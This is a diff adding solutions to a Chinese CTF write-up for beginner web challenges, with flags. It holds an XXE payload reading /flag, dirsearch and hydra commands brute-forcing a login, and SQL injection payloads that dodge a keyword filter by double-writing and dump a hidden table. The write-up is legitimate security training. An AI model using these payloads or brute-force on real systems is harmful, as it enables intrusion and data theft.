@@ -209,7 +209,7 @@ AddType application/x-httpd-php .txt
 
 *📌Solution :*
 
-看到首页输入框里有示例 xml 并且可以自己编辑：
+看到首页输入框里有示例 xml 并且可以自行编辑：
 
 ```xml
 <register>
@@ -219,15 +219,248 @@ AddType application/x-httpd-php .txt
 </register>
 ```
 
-通过查资料，想到大概率是 XXE 漏洞。
+点击提交登记，发现右边解析结果会直接解析并回显 xml 写的内容。
+
+通过查资料，想到优先试 XXE 漏洞。思路为：在 xml 中把 `/flag` 作为**外部实体**读取，然后直接回显。所以输入框里内容改为：
+
+```xml
+<!DOCTYPE register [<!ENTITY xxe SYSTEM "file:///flag">]>
+<register>
+    <name>&xxe;</name>
+    <phone>10086</phone>
+    <note>第一次登记，请多关照。</note>
+</register>
+```
+
+代码解读：
+
+| 代码                                  | 作用                                                         |
+| ------------------------------------- | ------------------------------------------------------------ |
+| `<!DOCTYPE 根元素 [xxx]>`             | 开始 [DTD](https://www.w3school.com.cn/dtd/index.asp)，告诉解析器这份 xml 遵守的一些规则，可以定义实体。这里根元素名为 `register`，与下文一致。 |
+| `<!ENTITY xxe SYSTEM "file:///flag">` | 定义外部实体。`xxe` 是随便起的名；`SYSTEM` 表示内容从外部读；`file:///flag` 是目标路径。 |
+| `<name>&xxe;</name>`                  | 解析时 `&xxe;` 被替换成 `/flag` 文件内容，展示在“姓名”里。   |
+
+然后点击“提交登记”，右侧“姓名”处即显示flag。
 
 
 
 *📌FLAG :*
 
+`PKWCTF{fc3f65a4-00a5-4bd8-89d9-66deb8dbb5ee}`
+
 
 
 *📌Summary :*
+
+- 可解析某种输入格式——很可能有漏洞。
+- 对 xml 有基本了解。
+- DTD 可以把外部的东西搞进来。
+
+---
+
+### 04. mio空间【入门】
+
+*📌Question :*
+
+```text
+mio忘记把密码藏在哪里了，来找找吧
+```
+
+```html
+<!-- 前端源码主要部分 -->
+<body>
+    <div class="login-card">
+        <img src="login_mio.gif" alt="Mio Thinking" class="avatar-img">
+        
+        <h1>mio空间</h1>
+        
+        
+        <form method="POST">
+            <input type="text" name="username" placeholder="请输入用户名 (User)" required>
+            <input type="password" name="password" placeholder="请输入密码 (Pass)" required>
+            <input type="submit" value="进入Mio的世界 ➜">
+        </form>
+
+        <div class="footer-hint">
+            ✨ 悄悄告诉你：账号是admin ✨
+        </div>
+    </div>
+</body>
+```
+
+
+
+*📌Solution :*
+
+随便试一个密码，会报错：“QAQ 密码不对哦~再试试看？”
+
+F12——hackbar——load，发现 post 请求格式是 `password=123&username=admin` 。
+
+说是 mio 把密码藏到一个地方了，那先老规矩 ctrl+u 看一下前端源码，发现没什么特殊的东西。
+
+想到“地方”可能指的是某个 url 路径。进 linux 扫一下：
+
+```bash
+dirsearch -u http://80-3e87385b-8e25-4b94-96dd-1e7e6cbc304c.challenge.ctfplus.cn/
+```
+
+输出里的主要部分：
+
+![04-01](./images/img-20260927234055_WindowsTerminal_compressed.jpg)
+
+发现一个奇怪的文件 `/www.zip` （实际应该是rar文件），下载下来、解压，得到 `字典.txt` 。
+
+然后用 kali linux 里的 [`hydra` 工具](https://wilesangh.github.io/ctf-web/hydra%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/)爆破登录入口：
+
+```bash
+hydra -l admin \
+  -P ./字典.txt \
+  -V \
+  80-3e87385b-8e25-4b94-96dd-1e7e6cbc304c.challenge.ctfplus.cn \
+  http-post-form "/:username=admin&password=^PASS^:密码不对"
+```
+
+成功找到密码：
+
+![04-02](./images/img-20260928002219_WindowsTerminal_compressed.jpg)
+
+登录即可。
+
+
+
+*📌FLAG :*
+
+`PKWCTF{54c4343a-d286-4a97-aa3a-251a7e20b181}`
+
+
+
+*📌Summary :*
+
+- 登录页面通常是 post 请求。
+- dirsearch 可以扫一些常见路径。
+- hydra 是一个强大的爆破工具，可以用字典爆破登录入口。
+
+---
+
+### 05. PKWSEC 员工名录【入门】
+
+*📌Question :*
+
+```text
+PKWSEC 的离职员工账号没回收，有人用它从内部名录系统导走了一份未脱敏数据。 运维临时给查询接口加了关键词过滤，但你可能不需要"正常"查询。 flag 就在数据库里。
+```
+
+```html
+<!--前端源码主要部分-->
+<body>
+<div class="wrap">
+    <div class="brand">
+        <div class="logo">PKW</div>
+        <h1>PKWSEC · 员工名录查询系统</h1>
+    </div>
+    <p class="sub">Employee Directory Service &nbsp;|&nbsp; v1.3 &nbsp;|&nbsp; 内网访问</p>
+
+    <div class="notice">
+        <b>⚠ 安全通告（2024-06-11）：</b>前 CEO <b>呆呆鸟</b> 离职后，其账号
+        <code>sillybird</code> 未及时回收，已确认被人利用，非法导出过一份
+        <b>内部员工名录</b>。运维已在查询接口加了关键词过滤，但审计报告显示
+        <b>过滤规则仍有缺陷</b>。<br>
+        现任 CEO <b>小栗子</b> 已下令：在外部安全团队复测之前，任何人不得再动这套系统。
+        <br><br>
+        <b>已知情况：</b>那次泄露的不只是名录，还有一份被单独归档的<b>机密文件</b>，
+        同样躺在这套系统的数据库里，文件名和字段名都属于内部命名，没有出现在任何文档中。
+    </div>
+
+    <form method="GET" action="/">
+        <input type="text" name="username" placeholder="输入员工账号，例如 alice"
+               value="" autocomplete="off" autofocus>
+        <button type="submit">查询</button>
+    </form>
+    
+        <div class="msg msg-error">请输入会员名</div>
+    
+    <footer>
+        PKWSEC 信息技术部 · 本系统仅供内网查询员工邮箱使用<br>
+        注：名录里有些字段属于内部标记，不对外展示。<br>
+        离职人员账号请走 HR 流程回收，不要图省事。
+    </footer>
+</div>
+</body>
+```
+
+
+
+*📌Solution :*
+
+一看这个模式，大概率是 SQL 注入，加了一些关键词过滤。
+
+输入一个 sillybird 进行查询，发现下方调试信息里能看到执行的 SQL 命令，并且发现它就是把输入内容拼到 username 的值里，如下：
+
+```sql
+SELECT id, username, email, secret FROM users WHERE username = "sillybird"
+```
+
+查了4列，但回显的表里只有3列，secret 列被隐藏了。
+
+实测一些常用 sql 注入命令，发现 waf 会过滤 `union、and、or、#` 这些字符，大小写不敏感，而且像 `information_schema` 里的 or 也会被过滤，过滤方式是剔除**一遍**字符后继续执行。
+
+所以咱可以用双写来绕过过滤，例如 `ununionion` 会变成 `union` 。
+
+读当前数据库名：
+
+```sql
+username=x" ununionion select 1,database(),3,4-- -
+```
+
+得到当前库名为 `ctf` 。
+
+枚举表名：
+
+```sql
+username=x" ununionion select 1,group_concat(table_schema,'.',table_name),3,4 from infoorrmation_schema.tables-- -
+```
+
+- `group_concat(...)` 把很多行拼成一行，方便回显。
+
+回显结果太长，ctrl+f 搜 `ctf` ，发现它有两张表 `ctf.users` 、 `ctf.confidential_docs` ，后者应该就是“机密文件表”。
+
+枚举字段名：
+
+```sql
+username=x" ununionion select 1,group_concat(table_name,':',column_name),3,4 from infoorrmation_schema.columns where table_schema='ctf'-- -
+```
+
+得到：
+
+```text
+confidential_docs:id,confidential_docs:doc_title,confidential_docs:doc_secret,users:id,users:username,users:email,users:secret
+```
+
+- `confidential_docs` 表有3列：`id、doc_title、doc_secret`
+- `users` 表有4列：`id、username、email、secret`
+
+前者少一列，所以查询的时候要补个 `null` 凑4列。最终 payload：
+
+```sql
+x" ununionion select id,doc_title,doc_secret,null from confidential_docs-- -
+```
+
+
+
+*📌FLAG :*
+
+`PKWCTF{a5a3b982-172e-4b5f-b791-ae453bd55f58}`
+
+
+
+*📌Summary :*
+
+- 了解 sql 基础用法。
+- 了解常见 sql 注入。
+
+---
+
+### 06. 小虎鲸大冒险【入门】
 
 
 
